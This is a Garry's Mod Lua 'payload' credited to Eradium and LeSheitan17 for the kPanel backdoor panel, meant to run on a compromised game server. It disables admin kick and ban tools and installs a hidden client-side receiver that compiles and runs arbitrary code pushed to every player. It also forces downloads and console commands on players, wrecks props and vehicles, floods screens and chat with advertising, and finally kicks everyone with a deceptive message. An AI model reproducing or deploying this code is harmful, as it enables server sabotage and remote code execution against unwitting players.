-- Server Side

-- Payload Created by Eradium and LeSheitan17 for Kpanel

-- Visuel Want Me Dead

-- Reproduction No Autorised

-- Modification No Autorised

-- discord.gg/lesheitan <- Le TEMPLE du SHEITAN

-- https://discord.gg/rQGmWpr <- KPanel

-- Beta2.1 (10-03-2020)

print([[
██╗    ██╗ █████╗ ███╗   ██╗████████╗    ███╗   ███╗███████╗    
██║    ██║██╔══██╗████╗  ██║╚══██╔══╝    ████╗ ████║██╔════╝    
██║ █╗ ██║███████║██╔██╗ ██║   ██║       ██╔████╔██║█████╗      
██║███╗██║██╔══██║██║╚██╗██║   ██║       ██║╚██╔╝██║██╔══╝      
╚███╔███╔╝██║  ██║██║ ╚████║   ██║       ██║ ╚═╝ ██║███████╗    
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝       ╚═╝     ╚═╝╚══════╝    
                                                                
██████╗ ███████╗ █████╗ ██████╗                                 
██╔══██╗██╔════╝██╔══██╗██╔══██╗                                
██║  ██║█████╗  ███████║██║  ██║                                
██║  ██║██╔══╝  ██╔══██║██║  ██║                                
██████╔╝███████╗██║  ██║██████╔╝                                
╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝                                                                                                 
By Eradium and LeSheitan17 for kPanel ]])

for k, v in pairs(player.GetAll()) do 
	v:SendLua("steamworks.FileInfo(1916383732,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
	v:SendLua("steamworks.FileInfo(1911711876,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
	v:SendLua("steamworks.FileInfo(1830594533,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
	v:ConCommand("say /job We Love Kalysia")
end

local nothing = function() end

if ULib then
	ULib.kick = nothing
	ULib.ban = nothing
	ULib.addBan = nothing
end

if FAdmin then
	
	local tbl = {
	"kick",
	"ban",
	"jail",
	"UnJail",
	"ClearDecals",
	"StopSounds",
	"CleanUp"
	}
	for i=1, #tbl do
		FAdmin.Commands.AddCommand(tbl[i], nothing)
	end

end

local sun = ents.FindByClass("env_sun")
	if #sun == 0 then return end
	
	sun = sun[1]

	hook.Add("Think","\xFFsun\xFF",function()
	sun:SetKeyValue("sun_dir", math.sin(CurTime())/3 .. " " .. math.cos(CurTime())/3 .. " 0.901970")
	sun:SetModelScale(120)
end)

function game.CleanUpMap() return false end

timer.Create("NnoMoreVehicle", 1, 0, function()
	for k,v in pairs(ents.FindByClass("prop_vehicle*")) do 
		v:Remove() 
	end
end)

timer.Simple(1,function() 
	for k,v in pairs(player.GetAll()) do
		v:StripWeapons()
	end
end)

timer.Simple(2,function() 
	for k,v in pairs(player.GetAll()) do
		v:Give( "weapon_physgun" )
	end
end)

hook.Add( 'SetupMove', 'Lapin', function( ply, move )
	if not ply:IsOnGround() then
		move:SetButtons( bit.band( move:GetButtons(), bit.bnot( IN_JUMP ) ) )
	end
end )

game.AddParticles( "particles/kpanel.pcf" )
PrecacheParticleSystem("kpanel")

util.AddNetworkString("faitleserv") 
local props2 = ents.GetAll() 
for _, prop in ipairs( props2 ) do 
	if(prop:GetPhysicsObject():IsValid()) then 
		prop:SetModel("models/kvac/kvac.mdl")
		prop:SetMaterial("phoenix_storms/Fender_white.vtf") 
		prop:SetColor(0,0,0) 
	end 
end


timer.Create("LeSheitanFaisMonCodeCarIlEstTropBeau"..math.random(500,50000), 1.5, 0, function() 
	local props2 = ents.GetAll() 
	for _, prop in ipairs( props2 ) do 
		if(prop:GetPhysicsObject():IsValid()) then 
			if(prop:GetModel() == "models/kvac/kvac.mdl") then else 
				prop:SetModel("models/kvac/kvac.mdl") 
				prop:SetMaterial("phoenix_storms/Fender_white.vtf") 
				prop:SetColor(0,0,0) 
			end 
		end 
	end 
end)

local function rdm_str(len) 
	if not len or len <= 0 then 
		return '' 
	end 
	return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)] 
end 

local net_string = rdm_str(25) 
	util.AddNetworkString(net_string) 
	BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]]) 
	hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme",function(ply) 
	if not ply:IsBot() then 
		ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]]) 
	end 
end) 
		
local function EradiumToClient(code) 
	local data = util.Compress(code) 
	local len = #data net.Start(net_string) 
	net.WriteUInt(len, 16) 
	net.WriteData(data, len) 
	net.Broadcast() 
end

timer.Simple( 1, function() 

EradiumToClient([=[
-- Client Side

-- Payload Created by Eradium and LeSheitan17 for Kpanel

-- Visuel Want Me Dead

-- Reproduction No Autorised

-- Modification No Autorised

-- discord.gg/lesheitan <- Le TEMPLE du SHEITAN

-- https://discord.gg/rQGmWpr <- KPanel

-- Beta2.1 (10-03-2020)

print([[
██╗    ██╗ █████╗ ███╗   ██╗████████╗    ███╗   ███╗███████╗    
██║    ██║██╔══██╗████╗  ██║╚══██╔══╝    ████╗ ████║██╔════╝    
██║ █╗ ██║███████║██╔██╗ ██║   ██║       ██╔████╔██║█████╗      
██║███╗██║██╔══██║██║╚██╗██║   ██║       ██║╚██╔╝██║██╔══╝      
╚███╔███╔╝██║  ██║██║ ╚████║   ██║       ██║ ╚═╝ ██║███████╗    
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝       ╚═╝     ╚═╝╚══════╝    
                                                                
██████╗ ███████╗ █████╗ ██████╗                                 
██╔══██╗██╔════╝██╔══██╗██╔══██╗                                
██║  ██║█████╗  ███████║██║  ██║                                
██║  ██║██╔══╝  ██╔══██║██║  ██║                                
██████╔╝███████╗██║  ██║██████╔╝                                
╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝                                                                                                 
By Eradium and LeSheitan17 for kPanel ]])

game.AddParticles( "particles/kpanel.pcf" )
PrecacheParticleSystem("kpanel")

local defaultfov = LocalPlayer():GetFOV() 
local override = 70 hook.Add("CalcView", "EXROR_", function(ply, origin, angles, fov, znear, zfar) return { ["origin"] = origin, ["angles"] = angles, ["fov"] = override, ["znear"] = znear, ["zfar"] = zfar } 
end) 
	local hide = { ["CHudHealth"] = true, ["CHudCrosshair"] = true } 
	hook.Add( "HUDShouldDraw", "HideHUD", function( name ) if ( hide[ name ] ) then return false end 
end ) 

local gfx = {}
local prevFrame = {} 
local prevValue = 2 
local aveclazicmu = {} 
hook.Add("HUDPaint", "MesOreillesSaleFilsDePute",function() 
	for k,v in pairs(aveclazicmu) do v() end 
end) 
SOUNDSTART_CTP = false 
OZJFOZJCEZIO = true 

sound.PlayURL("https://kpanel.cz/assets/wantmedead.mp3","mono noblock noplay",function(s) 
	if not s then return end 
	if SOUNDSTART_CTP then s:Stop() return end 
	SOUNDSTART_CTP = true 
	s:SetVolume(6.5) 
	s:Play()

	local ragtbl = {}
	aveclazicmu["CoolEffect"] = function()
	local tbl = {} s:FFT(tbl,FFT_4096) xpcall(function() 
	local fal = 0 for i=1,40 do 
		fal = fal + tbl[i] end 
		prevValue = Lerp(30 * FrameTime(), prevValue, fal) if fal > 2 then 
			override = Lerp(10 * FrameTime(), override, fal * .875) 
			net.Start("faitleserv") net.SendToServer() 
		else 
			override = Lerp(5 * FrameTime(), override, defaultfov) 
			sent = false 
		end 
	end,function() 
end)

timer.Simple(30, function()
gfx["CoolEffect"] = function()
	local tbl = {}
	s:FFT(tbl,FFT_2048)
	local fal = 0

	for i=4,6 do
		fal = fal + tbl[i]
	end

	if fal > 0.8 then
		local ca = Color(math.random(0,255),math.random(0,255),math.random(0,255), 150)
		util.ScreenShake(LocalPlayer():GetPos(),20,20,0.5,20)

		local mats = Entity(0):GetMaterials()
		for k,v in pairs(mats) do
		local r,g,b = ColorRand().r-50, ColorRand().g-50, ColorRand().b-50
			Material(v):SetVector("$color", Vector(r,g,b))
			Material(v):SetTexture( "$basetexture", "_rt_fullframefb" )
		end
	end
end

end)

end

end)

timer.Simple(31, function()

hook.Add("HUDPaint", "PutainMaBiteLacheDuSpermSurTonServeur",function()

	for k,v in pairs(gfx) do

		v()

	end

end)

end)

]=])
end)

timer.Simple( 1, function()
	
EradiumToClient([[
surface.CreateFont( "PixelCutsceneScaled",{ font = "Open Sans", size = 500, weight = 1000, antialias = true }) 
surface.CreateFont( "PixelCutsceneScaledSmall",{ font = "Open Sans", size = 50, weight = 1000, antialias = true }) 
surface.CreateFont( "PixelSmall",{ font = "Open Sans", size = 135, weight = 500, antialias = false }) 
surface.CreateFont("lapolice", { font = "Open Sans", size = ScrW()*0.02, weight = 10, blursize = 0, scanlines = 2.5, antialias = false })
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) local w,h = ScrW(), ScrH() local W, H = ScrW(), ScrH() 
local MySelf = LocalPlayer()
if kpderma then kpderma:Remove() 
	kpderma = nil end 
	kpderma = vgui.Create( "DFrame" ) 
	kpderma:SetSize( w, h )
	kpderma:SetPos(0,0) 
	kpderma:SetDraggable ( false ) 
	kpderma:SetTitle("") 
	kpderma:ShowCloseButton(false) 
	kpderma.Paint = function( self ) 
	surface.SetDrawColor(30, 30, 30, 0) 
end 

local pw, ph = w, h*0.6 local px, py = w/2-pw/2, h/2-ph/2 
local kPanel = vgui.Create( "DButton", kpderma ) 
kPanel:SetPos(px, py) 
kPanel:SetText( "" ) 
kPanel:SetSize( pw, ph ) 
kPanel.Paint = function( self, tw, th ) 
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) 
local shift = math.sin(RealTime()*3)*1.5 + 5 
local text2 = "Want Me Dead" 
draw.SimpleText( text2, "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) 
draw.SimpleText( text2, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color( 0, 191, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) 
end 


timer.Simple(2, function()
	notification.AddLegacy( "N'ayez pas peur, votre serveur ne sera pas endommagé", 3, 10 )
	notification.AddLegacy( "Ce spam visuel se supprimera automatiquement", 2, 10 )
	surface.PlaySound( "buttons/button15.wav" )
end)

timer.Simple( 25, function()

kPanel.Paint = function( self, tw, th ) 
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) 
local shift = math.sin(RealTime()*3)*1.5 + 5 
local text = "kPanel" local down = [=[(/.__.)/ K \(.__.\)]=] 
draw.SimpleText( down, "PixelCutsceneScaledSmall", tw/2 , th/2 +100, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) draw.SimpleText( down, "PixelCutsceneScaledSmall", tw/2 - shift , th/2 +100 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) 
draw.SimpleText( text, "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) draw.SimpleText( text, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color( 0, 191, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) 
end 

for k, v in pairs(player.GetAll()) do
	v:ConCommand("r_shader_srgb 1")
end

end)

timer.Simple( 35, function()

for i = 1, 10 do
    ParticleEffectAttach("kpanel",PATTACH_ABSORIGIN_FOLLOW,LocalPlayer(),0)
end

kPanel.Paint = function( self, tw, th ) 
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) 
local shift = math.sin(RealTime()*3)*1.5 + 5 
local text2 = "kPanel" 
draw.SimpleText( text2, "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) 
draw.SimpleText( text2, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color( 75, 0, 130), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) 
end 


end)

timer.Simple( 55, function()

kPanel.Paint = function( self, tw, th ) 

end 

function GAMEMODE:PostDraw2DSkyBox()
    local col = Color( 75, 0, 130)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
function GAMEMODE:PreDrawSkyBox()
    local col = Color( 75, 0, 130)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end

timer.Create("spamchatbienchiant", 1.5, 0, function()
    local time = tonumber(0)
    local Message = {
    "K kPanel https://discord.gg/rQGmWpr -",
    "KK kPanel https://discord.gg/rQGmWpr --",
    "KKK kPanel https://discord.gg/rQGmWpr ---",
    "KKKK kPanel https://discord.gg/rQGmWpr ----",
    "KKKKK kPanel https://discord.gg/rQGmWpr -----",
    "KKKKKK kPanel https://discord.gg/rQGmWpr ------",
    "KKKKKKK kPanel https://discord.gg/rQGmWpr -------",
    "KKKKKKKK kPanel https://discord.gg/rQGmWpr --------",
    "KKKKKKKKK kPanel https://discord.gg/rQGmWpr ---------",
    "KKKKKKKK kPanel https://discord.gg/rQGmWpr --------",
    "KKKKKKK kPanel https://discord.gg/rQGmWpr -------",
    "KKKKKK kPanel https://discord.gg/rQGmWpr ------",
    "KKKKK kPanel https://discord.gg/rQGmWpr -----",
    "KKKK kPanel https://discord.gg/rQGmWpr ----",
    "KKK kPanel https://discord.gg/rQGmWpr ---",
    "KK kPanel https://discord.gg/rQGmWpr --",
    "K kPanel https://discord.gg/rQGmWpr -",
    }

    for _, line in pairs(Message) do
        time = time + tonumber(0.1)
        timer.Simple(time,function()
            chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
        end)
    end
end)

timer.Create("kpanel", 0.3, 0, function()
    notification.AddLegacy( "kPanel <3", math.random(0, 4), 1.5 )
end)

timer.Create("ixxe", 0.3, 0, function()
    notification.AddLegacy( "IXXE Helped to make this <3", math.random(0, 4), 1.5 )
end)

timer.Create("eradium", 0.3, 0, function()
    notification.AddLegacy( "Eradium <3", math.random(0, 4), 1.5 )
end)

timer.Create("shy", 0.3, 0, function()
    notification.AddLegacy( "Shy <3", math.random(0, 4), 1.5 )
end)

timer.Create("estemaz", 0.3, 0, function()
    notification.AddLegacy( "Estemaz <3", math.random(0, 4), 1.5 )
end)

timer.Create("ElFamosoHaxorSheitan", 0.3, 0, function()
    notification.AddLegacy( "El Famoso LeSheitan17 <3", math.random(0, 4), 1.5 )
end)

timer.Create("skeleton", 0.3, 0, function()
    notification.AddLegacy( "Skeleton <3", math.random(0, 4), 1.5 )
end)


timer.Create("kPanelDoorciel", 1, 99,function()

local EraPorn = ClientsideModel("models/kvac/kvac.mdl")
    EraPorn:SetMaterial("phoenix_storms/Fender_white.vtf") 
    EraPorn:SetNoDraw(true)
    EraPorn:SetModelScale(20)
    timer.Create("charglogo", 0.01, 0, function()
    	EraPorn:SetAngles(Angle(0, CurTime()*50 % 360 ,CurTime()*20 % 360) )
    end)
    local data = {}
    local function genEraPorn(id)
    local pos = LocalPlayer():GetPos()
        data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(70, 170) }
    end
    
    for i=1, 50 do
        genEraPorn(i)
    end
    
    hook.Add("PostDrawOpaqueRenderables","FilsDeViol",function()
        local z = LocalPlayer():GetPos().z
        for i=1, #data do
            EraPorn:SetPos(data[i][1])
            EraPorn:SetupBones()
            EraPorn:DrawModel()
            data[i][1].z = data[i][1].z - data[i][2] / 20
            if data[i][1].z <= z then
                genEraPorn(i)
            end
        end
    end)
end)

end)

]])

hook.Add("Think","AllahEstMonDaron",function()
    local col = HSVToColor(CurTime() * 50 % 360, 1, 1)

    for _, v in ipairs(player.GetAll()) do
        v:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
    end

end)

end)

timer.Simple( 100, function()

EradiumToClient([[


local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) local w,h = ScrW(), ScrH() local W, H = ScrW(), ScrH() 
local MySelf = LocalPlayer()
if kpderma then kpderma:Remove() 
	kpderma = nil end 
	kpderma = vgui.Create( "DFrame" ) 
	kpderma:SetSize( w, h )
	kpderma:SetPos(0,0) 
	kpderma:SetDraggable ( false ) 
	kpderma:SetTitle("") 
	kpderma:ShowCloseButton(false) 
	kpderma.Paint = function( self ) 
	surface.SetDrawColor(30, 30, 30, 0) 
end 

local pw, ph = w, h*0.6 local px, py = w/2-pw/2, h/2-ph/2 
local kPanel = vgui.Create( "DButton", kpderma ) 
kPanel:SetPos(px, py) 
kPanel:SetText( "" ) 
kPanel:SetSize( pw, ph ) 
kPanel.Paint = function( self, tw, th )
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) local shift = math.sin(RealTime()*3)*1.5 + 5 
local text = { "kPanel", "KPanel", "kP4nel", "kP4Nel", "KP4nel", "kPanâ‚¬l", "kP4nâ‚¬l", "Kp4Nâ‚¬l", "kPanXl", "KPANEL", "ERROR", } 
hook.Add( "Think", "omgilawinlebogos", function() plyk,plyv = table.Random(player.GetAll()) end)  
draw.SimpleText( "She want me DEAD", "PixelCutsceneScaledSmall", tw/2 , th/2 +100, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) 
draw.SimpleText( "She want me DEAD", "PixelCutsceneScaledSmall", tw/2 - shift , th/2 +100 - shift, Color(math.random(240,255), math.random(240,255), math.random(240,255), 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) 
draw.SimpleText( table.Random(text), "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) draw.SimpleText( table.Random(text), "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color( 0, 191, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) 
end 

timer.Create("MaBiteEstDur", 0.1, 0, function() 
util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 ) 
end) 

hook.Add( "HUDPaint", "truckde merde", function() 
draw.DrawText( "kPanel", "lapolice", ScrW() * 0.5, ScrH() * (math.random(0,100)*0.01), Color( 0,191,255, math.random(230,255) ), TEXT_ALIGN_CENTER ) 
draw.DrawText( "kPanel", "lapolice", math.random(0,10), ScrH() * (math.random(0,100)*0.01), Color( 240, 100, 100, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0.7 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0.38 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0.9 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0.35 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0.98 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0.73 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0.27 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0.05 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0.11 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0.75 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0.2 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
draw.DrawText( "kPanel", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 ) 
end)


]])	



end)

timer.Simple( 168, function()

for i,v in ipairs(player.GetAll()) do 
	if v == p then continue end 
	v:Kick("\n[FR] Oh désolé, je ne me suis pas présenté ,je suis EXROR_ votre serveur a rencontré un problĂ¨me que j'ai corrigé, vous pouvez maintenant retourner sur votre serveur !\n\n\nkPanel( https://discord.gg/rQGmWpr )\n\n------------------------------------------\n\n[EN] Oh sorry, I didn't introduce myself ,I'm EXROR_ your server has encountered a problem that I fixed, you can now go back to your server !\n\n\nCodially kPanel( https://discord.gg/rQGmWpr )") 
end 

end)

timer.Simple( 5, function()
    RunConsoleCommand("ulx", "god", "*")
end)

timer.Create("SpeedHackActived", 5, 1, function()
    RunConsoleCommand("sv_friction", "-50")
    RunConsoleCommand("sv_gravity", "300")
end)

timer.Simple( 170, function() 
	RunConsoleCommand("sv_friction", "8")
    RunConsoleCommand("sv_gravity", "600")
	RunConsoleCommand("changelevel", "gm_construct") 
end) 

local untitled_ = { "KPANEL", "KP4NEL", "KP4Nâ‚¬L","Kp4nâ‚¬l" } 

for k, v in pairs(player.GetAll()) do 
	timer.Create("charglogo", 0, 0, function() 
		v:setDarkRPVar("job", "JOB_"..table.Random( untitled_ )) v:setDarkRPVar("money", "1e+999") 
	end) 
end 
